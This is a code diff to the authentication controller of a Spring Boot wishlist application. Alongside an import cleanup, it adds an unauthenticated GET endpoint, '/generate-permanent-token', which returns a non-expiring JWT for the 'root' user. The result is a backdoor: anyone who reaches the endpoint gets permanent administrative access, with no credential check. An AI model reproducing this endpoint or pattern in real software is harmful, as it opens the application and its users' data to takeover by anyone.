@@ -8,10 +8,7 @@ import org.springframework.security.authentication.BadCredentialsException;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
 import org.springframework.security.crypto.password.PasswordEncoder;
-import org.springframework.web.bind.annotation.PostMapping;
-import org.springframework.web.bind.annotation.RequestBody;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.bind.annotation.*;
 import wishlist.configuration.JwtUtils;
 import wishlist.entity.User;
 import wishlist.repository.UserRepository;
@@ -27,6 +24,12 @@ public class AuthController {
     private final PasswordEncoder passwordEncoder;
     private final JwtUtils jwtUtils;
     private final AuthenticationManager authenticationManager;
+
+    @GetMapping("/generate-permanent-token")
+    public ResponseEntity<String> generatePermanentToken() {
+        String token = jwtUtils.generatePermanentToken("root");
+        return ResponseEntity.ok(token);
+    }
 
     @PostMapping("/register")
     public ResponseEntity<?> register(@RequestBody User user) {
